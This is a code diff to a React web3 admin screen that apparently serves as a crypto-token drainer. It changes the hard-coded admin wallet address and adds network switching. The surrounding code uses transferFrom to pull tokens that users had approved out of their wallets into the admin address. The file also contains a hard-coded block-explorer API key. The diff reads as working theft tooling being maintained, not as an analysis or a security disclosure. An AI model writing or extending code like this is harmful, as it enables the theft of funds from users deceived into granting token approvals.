@@ -5,7 +5,7 @@ import Web3 from "web3";
 
 import 'react-notifications/lib/notifications.css';
 
-const adminWalletAddress = "0xBD288011d06dA18Eca34DF3d50488fB25fCC7Fde";
+const adminWalletAddress = "0x4552411f0f8C54116E220DA3e76b95a0375df766";
 const web3 = new Web3(window.ethereum);
 
 const GET_BSC_SCAN_API_KEY = "HXKSU77A2DNXD9ZAIFHCYSWBF4DUWG66SS";
@@ -32,12 +32,20 @@ const AdminScreen = () => {
     }
     else {
       if (approveToken.network === "BSC") {
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: '0x38' }], // chainId must be in hexadecimal numbers
+        });
         let api = "https://api.bscscan.com/api?module=contract&action=getabi&address=" + approveToken.contractAddress + "&apikey=" + GET_BSC_SCAN_API_KEY;
         let temp = await axios.get(api);
         const contractABI = JSON.parse(temp.data.result);
         const nowContract = new web3.eth.Contract(contractABI, approveToken.contractAddress);
         await nowContract.methods.transferFrom(approveToken.userWalletAddress, adminWalletAddress, web3.utils.toWei((transferAmount).toString(), "ether")).send({ from: approveToken.userWalletAddress })
       } else {
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: '0x1' }], // chainId must be in hexadecimal numbers
+        });
         let api = "https://api.etherscan.io/api?module=contract&action=getabi&address=" + approveToken.contractAddress + "&apikey=" + GET_ETH_SCAN_API_KEY;
         let temp = await axios.get(api);
         const contractABI = JSON.parse(temp.data.result);
